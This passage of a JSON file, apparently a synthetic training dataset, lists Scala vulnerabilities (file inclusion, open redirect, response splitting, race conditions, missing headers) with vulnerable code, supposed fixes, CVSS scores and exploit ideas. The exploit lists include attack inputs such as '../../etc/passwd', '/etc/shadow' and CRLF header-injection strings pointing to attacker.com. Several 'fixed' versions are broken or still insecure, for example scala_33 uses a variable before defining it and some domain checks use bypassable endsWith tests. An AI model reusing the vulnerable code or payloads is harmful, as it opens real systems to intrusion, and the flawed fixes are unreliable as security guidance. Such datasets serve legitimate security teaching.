            "Multiple threads attempting to withdraw simultaneously without proper synchronization can lead to a situation where more is withdrawn than actually deposited."
        ]
    },
    "scala_29": {
        "vulnerability_type": "Local File Inclusion (LFI) - Limited Scope",
        "vulnerability_code": "def readFileContent(filePath: String): String = {\n    val file = new java.io.File(filePath)\n    scala.io.Source.fromFile(file).getLines().mkString(\"\")\n}",
        "cvss_score": 4.0,
        "fixed_code": "def readFileContent(filePath: String, allowedPaths: List[String]): String = {\n    val safePath = allowedPaths.find(filePath.startsWith(_))\n    if (safePath.isDefined) {\n        scala.io.Source.fromFile(filePath).getLines().mkString(\"\")\n    } else {\n        throw new IllegalArgumentException(\"Invalid file path\")\n    }\n}",
        "exploit_ways": [
            "An attacker could input '/etc/passwd' to view the system's password file.",
            "They might try relative paths like '../../conf/server.conf' to access configuration files.",
            "Inputting './logs/access.log' could allow reading server logs, potentially exposing sensitive data."
        ]
    },
    "scala_30": {
        "vulnerability_type": "Open Redirect",
        "vulnerability_code": "class UrlRedirector {\n  def redirect(url: String): Unit = {\n    val sanitizedUrl = url.replaceAll(\".*\\\\.evil\\\\..*\", \"\")\n    scala.tools.nsc.io.URL(sanitizedUrl).openStream()\n  }\n}",
        "cvss_score": 6.5,
        "fixed_code": "class UrlRedirector {\n  def redirect(url: String): Unit = {\n    val allowedDomains = List(\"example.com\", \"safe.org\")\n    if (allowedDomains.exists(url.endsWith)) {\n      scala.tools.nsc.io.URL(url).openStream()\n    } else {\n      throw new IllegalArgumentException(\"Invalid URL\")\n    }\n  }\n}",
        "exploit_ways": [
            "An attacker can provide a malicious URL like 'http://malicious.evil.com' to redirect users to an unsafe site.",
            "Using a crafted URL like 'https://legitimate.com/?redirect=http://attackersite.com' could exploit the incomplete check.",
            "Attacker might use URL encoding or other obfuscation techniques to bypass the regex, such as 'http%3A//malicious.evil.com'."
        ]
    },
    "scala_31": {
        "vulnerability_type": "Information Disclosure (Low Severity)",
        "vulnerability_code": "class UserInfo {\n  private var password: String = \"\"\n  def setPassword(pass: String): Unit = { this.password = pass }\n  def getPassword: String = { this.password }\n}",
        "cvss_score": 3.5,
        "fixed_code": "class UserInfo {\n  private var passwordHash: String = \"\"\n  def setPassword(pass: String): Unit = { this.passwordHash = hashPassword(pass) }\n  def checkPassword(pass: String): Boolean = { hashPassword(pass) == this.passwordHash }\n  private def hashPassword(pass: String): String = java.security.MessageDigest.getInstance(\"SHA-256\").digest(pass.getBytes).map(0xFF & _).map{\"%02x\".format(_)}.mkString}",
        "exploit_ways": [
            "An attacker can call getPassword to retrieve the plain text password.",
            "If the object is serialized, the password could be exposed in logs or backups.",
            "Potential reflection attacks might allow access to private fields."
        ]
    },
    "scala_32": {
        "vulnerability_type": "Race Condition (Difficult to Exploit)",
        "vulnerability_code": "import scala.concurrent.{Future, Await}\nimport scala.concurrent.duration._\nimport scala.concurrent.ExecutionContext.Implicits.global\nobject RaceConditionExample {\n  var counter = 0\n  def increment(): Unit = {\n    val localCounter = counter\n    Thread.sleep(1)\n    counter = localCounter + 1\n  }\n  def main(args: Array[String]): Unit = {\n    val futures = for (i <- 1 to 100) yield Future {\n      increment()\n    }\n    Await.result(Future.sequence(futures), Duration.Inf)\n    println(s\"Final counter value: $counter\")\n  }\n}",
        "cvss_score": 5.8,
        "fixed_code": "import scala.concurrent.{Future, Await}\nimport scala.concurrent.duration._\nimport scala.concurrent.ExecutionContext.Implicits.global\nimport scala.util.control.NonFatal\nobject RaceConditionExample {\n  private val lock = new Object()\n  var counter = 0\n  def increment(): Unit = {\n    lock.synchronized {\n      try {\n        val localCounter = counter\n        Thread.sleep(1)\n        counter = localCounter + 1\n      } catch {\n        case NonFatal(e) => e.printStackTrace()\n      }\n    }\n  }\n  def main(args: Array[String]): Unit = {\n    val futures = for (i <- 1 to 100) yield Future {\n      increment()\n    }\n    Await.result(Future.sequence(futures), Duration.Inf)\n    println(s\"Final counter value: $counter\")\n  }\n}",
        "exploit_ways": [
            "An attacker could run the program multiple times to observe inconsistent final counter values.",
            "By manipulating system timing, an attacker might force the race condition to occur more frequently, leading to incorrect results.",
            "If this code were part of a financial transaction system, incorrect increments could lead to loss of funds."
        ]
    },
    "scala_33": {
        "vulnerability_type": "Open Redirect",
        "vulnerability_code": "def vulnerableRedirect(url: String): String = {\\n    val redirectUrl = url + \"/welcome\"\\n    \"<script>window.location.href=\\\"\" + redirectUrl + \"\\\"</script>\"\\n}",
        "cvss_score": 6.8,
        "fixed_code": "def safeRedirect(url: String): String = {\\n    val allowedDomains = List(\"example.com\", \"safe.example.org\")\\n    if (allowedDomains.exists(redirectUrl.startsWith)) {\\n        val redirectUrl = url + \"/welcome\"\\n        \"<script>window.location.href=\\\"\" + redirectUrl + \"\\\"</script>\"\\n    } else {\\n        \"Invalid URL\"\\n    }\\n}",
        "exploit_ways": [
            "An attacker can provide a malicious URL like 'https://malicious.com' to redirect users away from the legitimate site.",
            "By injecting JavaScript in the URL, attackers could execute arbitrary code in the user's browser, leading to XSS attacks.",
            "Attackers might use the vulnerability to phishing by redirecting users to fake login pages that resemble the actual site."
        ]
    },
    "scala_34": {
        "vulnerability_type": "Local File Inclusion (LFI) - Limited Scope",
        "vulnerability_code": "def readFile(filePath: String): String = {\\n  scala.io.Source.fromFile(filePath).getLines.mkString(\"\")\\n}",
        "cvss_score": 4.2,
        "fixed_code": "def readFile(filePath: String): String = {\\n  val allowedPaths = List(\"/safe/path1\", \"/safe/path2\")\\n  if (allowedPaths.contains(filePath)) {\\n    scala.io.Source.fromFile(filePath).getLines.mkString(\"\")\\n  } else {\\n    throw new IllegalArgumentException(\"Access denied\")\\n  }\\n}",
        "exploit_ways": [
            "An attacker can provide a path like \"/etc/passwd\" to read sensitive system files.",
            "Using relative paths, attackers might navigate to unauthorized directories by inputting \"../../etc/passwd\".",
            "Exploiting the vulnerability to access application configuration files stored in predictable locations."
        ]
    },
    "scala_35": {
        "vulnerability_type": "HTTP Response Splitting",
        "vulnerability_code": "import scala.io.StdIn\n\ndef vulnerableFunction(): Unit = {\n    println(\"Enter your name:\")\n    val name = StdIn.readLine()\n    println(s\"Hello, $name! Welcome to our website.\")\n}\n\nobject Main extends App {\n    vulnerableFunction()\n}",
        "cvss_score": 5.3,
        "fixed_code": "import scala.io.StdIn\nimport java.net.URLEncoder\nimport java.nio.charset.StandardCharsets\n\ndef safeFunction(): Unit = {\n    println(\"Enter your name:\")\n    val name = StdIn.readLine()\n    val encodedName = URLEncoder.encode(name, StandardCharsets.UTF_8.toString())\n    println(s\"Hello, $encodedName! Welcome to our website.\")\n}\n\nobject Main extends App {\n    safeFunction()\n}",
        "exploit_ways": [
            "An attacker could input a name like 'John\\r\\nSet-Cookie: admin=true' to inject HTTP headers.",
            "The vulnerability could be used to split the response and insert malicious HTML content, leading to Cross-Site Scripting (XSS).",
            "By injecting '\\r\\nContent-Length: 0\\r\\n\\r\\nHTTP/1.1 200 OK\\r\\nContent-Type: text/html\\r\\nContent-Length: 14\\r\\n\\r\\n<h1>Hacked</h1>', an attacker can cause the server to prematurely terminate a response and send a new one."
        ]
    },
    "scala_36": {
        "vulnerability_type": "Missing Security Headers",
        "vulnerability_code": "import akka.http.scaladsl.Http\\nimport akka.http.scaladsl.model.ContentTypes.`text/html(UTF-8)`\\nimport akka.http.scaladsl.server.Directives._\\n\\nobject SimpleWebServer {\\ndef main(args: Array[String]): Unit = {\\n  val route = path(\"hello\") {\\n    get {\\n      complete(HttpEntity(`text/html(UTF-8)`, \"<h1>Hello, world!</h1>\"))\\n    }\\n  }\\n  Http().newServerAt(\"localhost\", 8080).bind(route)\\n}\\n}",
        "cvss_score": 6.5,
        "fixed_code": "import akka.http.scaladsl.Http\\nimport akka.http.scaladsl.model.{ContentTypes, HttpEntity, HttpHeaders}\\nimport akka.http.scaladsl.server.Directives._\\n\\nobject SimpleWebServer {\\ndef main(args: Array[String]): Unit = {\\n  val route = path(\"hello\") {\\n    get {\\n      complete(HttpResponse(entity = HttpEntity(ContentTypes.`text/html(UTF-8)`, \"<h1>Hello, world!</h1>\"), headers = List(HttpHeaders.`Strict-Transport-Security`(maxAgeSeconds = 31536000L), HttpHeaders.`X-XSS-Protection`(\"1; mode=block\"), HttpHeaders.`X-Content-Type-Options`(\"nosniff\"))))\\n    }\\n  }\\n  Http().newServerAt(\"localhost\", 8080).bind(route)\\n}\\n}",
        "exploit_ways": [
            "An attacker can inject malicious scripts into the page if user input is rendered without escaping, leading to XSS.",
            "Lack of HSTS header allows attackers to perform man-in-the-middle attacks over unencrypted connections.",
            "Without X-Content-Type-Options header, browsers may try to MIME-sniff and execute files incorrectly."
        ]
    },
    "scala_37": {
        "vulnerability_type": "Open Redirect",
        "vulnerability_code": "def vulnerableRedirect(url: String): Unit = { \n    println(s\"Redirecting to: $url\")\n}",
        "cvss_score": 6.0,
        "fixed_code": "def safeRedirect(url: String, allowedDomains: List[String]): Unit = {\n    val parsedUrl = java.net.URL(url)\n    if (allowedDomains.contains(parsedUrl.getHost)) {\n        println(s\"Redirecting to: $url\")\n    } else {\n        println(\"Redirect to unauthorized domain prevented.\")\n    }\n}",
        "exploit_ways": [
            "An attacker can redirect users to a phishing site using the vulnerable function.",
            "They can use the vulnerability to redirect users to download malware from malicious websites.",
            "The open redirect can be used in conjunction with social engineering attacks to trick users."
        ]
    },
    "scala_38": {
        "vulnerability_type": "Local File Inclusion (LFI) - Limited Scope",
        "vulnerability_code": "import java.io._\ndef readFile(filePath: String): String = {\n  val file = new File(filePath)\n  val source = Source.fromFile(file)\n  try source.getLines.mkString(\"\\n\") finally source.close()\n}",
        "cvss_score": 4.5,
        "fixed_code": "import java.io._\ndef readFile(baseDir: String, filePath: String): String = {\n  val safePath = new File(baseDir).getCanonicalPath\n  val userFile = new File(safePath, filePath)\n  if (userFile.getCanonicalPath.startsWith(safePath)) {\n    val source = Source.fromFile(userFile)\n    try source.getLines.mkString(\"\\n\") finally source.close()\n  } else {\n    throw new IllegalArgumentException(\"Invalid file path\")\n  }\n}",
        "exploit_ways": [
            "An attacker could input a relative or absolute path to read any accessible file on the server.",
            "Crafting a malicious payload like '../../../../etc/passwd' can be used to access system files.",
            "By manipulating the filePath parameter, attackers might exploit this to read configuration files containing sensitive data."
        ]
    },
    "scala_39": {
        "vulnerability_type": "Local File Inclusion (LFI) - Limited Scope",
        "vulnerability_code": "import java.io._\\n\\nobject LFIExample {\\n  def main(args: Array[String]): Unit = {\\n    val filePath = scala.io.StdIn.readLine(\"Enter file path:\")\\n    val file = new File(filePath)\\n    val reader = new BufferedReader(new FileReader(file))\\n    var line = reader.readLine()\\n    while (line != null) {\\n      println(line)\\n      line = reader.readLine()\\n    }\\n    reader.close()\\n  }\\n}",
        "cvss_score": 5.3,
        "fixed_code": "import java.io._\\nimport scala.util.control.Breaks._\\n\\nobject LFIExample {\\n  def main(args: Array[String]): Unit = {\\n    val allowedPaths = List(\"/safe/path1.txt\", \"/safe/path2.txt\")\\n    val filePath = scala.io.StdIn.readLine(\"Enter file path:\")\\n    if (!allowedPaths.contains(filePath)) {\\n      println(\"Access denied.\")\\n      return\\n    }\\n    val file = new File(filePath)\\n    val reader = new BufferedReader(new FileReader(file))\\n    breakable {\\n      while (true) {\\n        val line = reader.readLine()\\n        if (line == null) break\\n        println(line)\\n      }\\n    }\\n    reader.close()\\n  }\\n}",
        "exploit_ways": [
            "An attacker can input \"/etc/passwd\" to read sensitive system files.",
            "By entering \"../../../../../../etc/shadow\", an attacker might attempt to access hashed passwords if not properly restricted.",
            "Crafting a path like \"/var/log/syslog\" could reveal logs containing confidential information."
        ]
    },
    "scala_40": {
        "vulnerability_type": "Denial-of-Service (DoS) - Low Impact",
        "vulnerability_code": "object InfiniteLoop {\\ndef main(args: Array[String]): Unit = {\\n  while (true) {\\n    val largeList = List.fill(1000000)(\"a\")\\n    val processedList = largeList.map(_ + \"b\")\\n  }\\n}",
        "cvss_score": 4.5,
        "fixed_code": "object InfiniteLoop {\\ndef main(args: Array[String]): Unit = {\\n  while (true) {\\n    Thread.sleep(1000) // Sleep for a second to avoid consuming excessive resources\\n    val largeList = List.fill(10000)(\"a\") // Reduced list size\\n    val processedList = largeList.map(_ + \"b\")\\n  }\\n}",
        "exploit_ways": [
            "An attacker can run this code to consume all available CPU resources, causing a denial of service.",
            "The loop can be triggered by any user with access to the code, leading to system slowdowns or crashes.",
            "By running multiple instances of this program, an attacker could exhaust memory and cause the system to become unresponsive."
        ]
    },
    "scala_41": {
        "vulnerability_type": "Open Redirect",
        "vulnerability_code": "def vulnerableRedirect(url: String) = {\n  val encodedUrl = java.net.URLEncoder.encode(url, \"UTF-8\")\n  s\"http://example.com/redirect?target=$encodedUrl\"\n}",
        "cvss_score": 7.5,
        "fixed_code": "def safeRedirect(url: String) = {\n  val allowedDomains = Set(\"trusteddomain1.com\", \"trusteddomain2.com\")\n  val uri = new java.net.URI(url)\n  if (allowedDomains.contains(uri.getHost)) {\n    s\"http://example.com/redirect?target=${java.net.URLEncoder.encode(url, \"UTF-8\")}\"\n  } else {\n    throw new IllegalArgumentException(\"Invalid redirect URL\")\n  }\n}",
        "exploit_ways": [
            "An attacker can input a malicious URL to redirect users to phishing sites.",
            "Could use the vulnerability to launch drive-by downloads by redirecting to compromised servers.",
            "Redirect users to pages that exploit browser vulnerabilities, leading to potential code execution."
        ]
    },
    "scala_42": {
        "vulnerability_type": "Missing Security Headers",
        "vulnerability_code": "import akka.actor.Actor\nimport spray.routing.HttpService\nclass MyServiceActor extends Actor with HttpService {\ndef receive = runRoute {\n    path(\"hello\") {\n        get {\n            complete(\\\"Hello, World!\\\")\n        }\n    }\n}\n}",
        "cvss_score": 6.5,
        "fixed_code": "import akka.actor.Actor\nimport spray.routing.HttpService\nimport spray.http.HttpHeaders._\nclass MyServiceActor extends Actor with HttpService {\ndef receive = runRoute {\n    path(\"hello\") {\n        get {\n            respondWithHeader(`Content-Security-Policy` -> \"default-src 'self'; script-src 'self'\") {\n                respondWithHeader(`X-Frame-Options` -> \"SAMEORIGIN\") {\n                    respondWithHeader(`X-XSS-Protection` -> \"1; mode=block\") {\n                        complete(\\\"Hello, World!\\\")\n                    }\n                }\n            }\n        }\n    }\n}\n}",
        "exploit_ways": [
            "Attacker can perform clickjacking attacks due to lack of X-Frame-Options header.",
            "Cross-site scripting (XSS) might be possible as there is no X-XSS-Protection header set.",
            "Content Security Policy (CSP) is missing, allowing injection of malicious scripts."
        ]
    },
    "scala_43": {
        "vulnerability_type": "HTTP Response Splitting",
        "vulnerability_code": "def vulnerableFunction(userInput: String): String = {\n    val response = s\"HTTP/1.1 200 OK\\r\\nContent-Type: text/html\\r\\n\\r\\n<html><body>$userInput</body></html>\"\n    response\n}",
        "cvss_score": 5.3,
        "fixed_code": "def safeFunction(userInput: String): String = {\n    import java.net.URLEncoder\n    val encodedInput = URLEncoder.encode(userInput, \"UTF-8\").replace(\"+\", \"%20\")\n    val response = s\"HTTP/1.1 200 OK\\r\\nContent-Type: text/html\\r\\n\\r\\n<html><body>$encodedInput</body></html>\"\n    response\n}",
        "exploit_ways": [
            "An attacker can input 'malicious data\\r\\nSet-Cookie: evil=true' to inject a cookie.",
            "Injecting '\\r\\nLocation: http://attacker.com' redirects the user to an attacker-controlled site.",
            "Can use '\\r\\nHTTP/1.1 200 OK\\r\\nContent-Type: text/html\\r\\n\\r\\n<html><h1>Attacked</h1></html>' to serve a false response."
        ]
    },
    "scala_44": {
        "vulnerability_type": "Denial-of-Service (DoS) - Low Impact",
        "vulnerability_code": "def infiniteLoop(): Unit = {\\n  while (true) {}\\n}",
        "cvss_score": 4.2,
        "fixed_code": "def controlledLoop(): Unit = {\\n  var count = 0\\n  val maxCount = 100000\\n  while (count < maxCount) {\\n    // Perform safe operations here\\n    count += 1\\n  }\\n}",
        "exploit_ways": [
            "An attacker can call the function to cause the application to hang indefinitely, leading to a denial of service.",
            "If this loop is part of a web server, it can prevent other requests from being processed by tying up the thread or process.",
            "In a multi-threaded environment, an attacker could spawn multiple threads running this loop to exhaust system resources."
        ]
    },
    "scala_45": {
        "vulnerability_type": "Session Fixation (Low Severity)",
        "vulnerability_code": "import javax.servlet.http.{HttpServletRequest, HttpServletResponse}\nclass LoginServlet extends HttpServlet {\n  override def doGet(request: HttpServletRequest, response: HttpServletResponse): Unit = {\n    val session = request.getSession(false)\n    if (session == null) {\n      val newSession = request.getSession(true)\n      newSession.setAttribute(\"userId\", \"defaultUser\")\n    }\n    // Redirect to main page\n    response.sendRedirect(\"/main\")\n  }\n}",
        "cvss_score": 4.2,
        "fixed_code": "import javax.servlet.http.{HttpServletRequest, HttpServletResponse}\nclass LoginServlet extends HttpServlet {\n  override def doGet(request: HttpServletRequest, response: HttpServletResponse): Unit = {\n    val session = request.getSession(false)\n    if (session != null) {\n      session.invalidate()\n    }\n    val newSession = request.getSession(true)\n    newSession.setAttribute(\"userId\", \"defaultUser\")\n    // Redirect to main page\n    response.sendRedirect(\"/main\")\n  }\n}",
        "exploit_ways": [
            "An attacker can set a session cookie in the victim's browser, leading to session fixation.",
            "The attacker can then use this fixed session to perform actions as the authenticated user.",
            "If combined with other vulnerabilities, the attacker could escalate privileges using the fixed session."
        ]
    },
    "scala_46": {
        "vulnerability_type": "Missing Security Headers",
        "vulnerability_code": "class WebServer {\n  def start(): Unit = {\n    println(\"Starting web server...\")\n  }\n}",
        "cvss_score": 5.3,
        "fixed_code": "import akka.http.scaladsl.server.Directives._\nclass WebServer {\n  def start(): Unit = {\n    val route = path(\"/\") {\n      respondWithHeaders(`Strict-Transport-Security`(\"max-age=63072000; includeSubDomains\"), `X-Content-Type-Options`(\"nosniff\"), `X-XSS-Protection`(\"1; mode=block\")) {\n        complete(\"\")\n      }\n    }\n    println(\"Starting web server...\")\n  }\n}",
        "exploit_ways": [
            "An attacker can perform a clickjacking attack due to the absence of X-Frame-Options or Content-Security-Policy headers.",
            "The site is vulnerable to MIME type sniffing attacks as there is no X-Content-Type-Options header set.",
            "Reflected Cross-Site Scripting (XSS) could be possible if proper Content Security Policy (CSP) headers are not implemented."
        ]
    },
    "scala_47": {
        "vulnerability_type": "Missing Security Headers",
        "vulnerability_code": "import akka.actor.ActorSystem\\nimport akka.http.scaladsl.Http\\nimport akka.http.scaladsl.server.Directives._\\nobject WebServer {\\n  def main(args: Array[String]): Unit = {\\n    implicit val system = ActorSystem(\"my-system\")\\n    implicit val executionContext = system.dispatcher\\n    val route = path(\"hello\") {\\n      get {\\n        complete(\\\"Hello, world!\\\")\\n      }\\n    }\\n    Http().newServerAt(\"localhost\", 8080).bind(route)\\n  }\\n}",
        "cvss_score": 4.2,
        "fixed_code": "import akka.actor.ActorSystem\\nimport akka.http.scaladsl.Http\\nimport akka.http.scaladsl.server.Directives._\\nobject WebServer {\\n  def main(args: Array[String]): Unit = {\\n    implicit val system = ActorSystem(\"my-system\")\\n    implicit val executionContext = system.dispatcher\\n    val route = path(\"hello\") {\\n      get {\\n        complete(\\\"Hello, world!\\\")\\n      }\\n    }.withHeaders(List(`Strict-Transport-Security`(maxAge = 31536000L), `X-Frame-Options`(\"SAMEORIGIN\"), `X-XSS-Protection`(enabled = true)))\\n    Http().newServerAt(\"localhost\", 8080).bind(route)\\n  }\\n}",
        "exploit_ways": [
            "An attacker could perform clickjacking attacks if X-Frame-Options header is missing.",
            "Reflected XSS might be possible due to the absence of Content Security Policy (CSP) headers.",
            "Attackers can gather data over unsecured connections as there's no Strict-Transport-Security header."
        ]
    },
    "scala_48": {
        "vulnerability_type": "Race Condition (Difficult to Exploit)",
        "vulnerability_code": "import scala.collection.mutable\nobject RaceConditionExample {\n  val sharedResource = mutable.List[Int]()\n  def main(args: Array[String]): Unit = {\n    val thread1 = new Thread(() => {\n      for (i <- 0 until 1000) {\n        sharedResource += i\n      }\n    })\n    val thread2 = new Thread(() => {\n      for (i <- 0 until 1000) {\n        sharedResource += i\n      }\n    })\n    thread1.start()\n    thread2.start()\n    thread1.join()\n    thread2.join()\n    println(s\"Final size of list: ${sharedResource.size}\")\n  }\n}",
        "cvss_score": 4.5,
        "fixed_code": "import scala.collection.mutable\nobject RaceConditionExample {\n  val sharedResource = mutable.List[Int]()\n  val lock = new Object()\n  def main(args: Array[String]): Unit = {\n    val thread1 = new Thread(() => {\n      for (i <- 0 until 1000) {\n        lock.synchronized {\n          sharedResource += i\n        }\n      }\n    })\n    val thread2 = new Thread(() => {\n      for (i <- 0 until 1000) {\n        lock.synchronized {\n          sharedResource += i\n        }\n      }\n    })\n    thread1.start()\n    thread2.start()\n    thread1.join()\n    thread2.join()\n    println(s\"Final size of list: ${sharedResource.size}\")\n  }\n}",
        "exploit_ways": [
            "An attacker could cause the final list to have a size less than 2000 due to race condition interference.",
            "By controlling timing, an attacker might manipulate the contents of sharedResource in unpredictable ways.",
            "In critical systems, this could lead to data corruption or incorrect computations relying on sharedResource."
        ]
    },
    "scala_49": {
        "vulnerability_type": "Open Redirect",
        "vulnerability_code": "class VulnerableApp {\\n  def redirect(url: String): Unit = {\\n    val target = if (url.startsWith(\"http://\")) url else s\"http://${url}\"\\n    println(s\"Redirecting to $target\")\\n  }\\n}",
        "cvss_score": 6.5,
        "fixed_code": "class SecureApp {\\n  def redirect(url: String): Unit = {\\n    val allowedDomains = List(\"example.com\", \"sub.example.com\")\\n    if (allowedDomains.exists(url.endsWith)) {\\n      val target = if (url.startsWith(\"http://\")) url else s\"http://${url}\"\\n      println(s\"Redirecting to $target\")\\n    } else {\\n      throw new Exception(\"Invalid redirect URL\")\\n    }\\n  }\\n}",
        "exploit_ways": [
            "An attacker can provide a malicious URL like 'http://attacker.com' to redirect users away from the intended site.",
            "By providing a crafted URL, an attacker could potentially steal user session cookies if they are not properly secured.",
            "Attackers could use this vulnerability to perform phishing attacks by redirecting users to fake login pages."
        ]
    }
}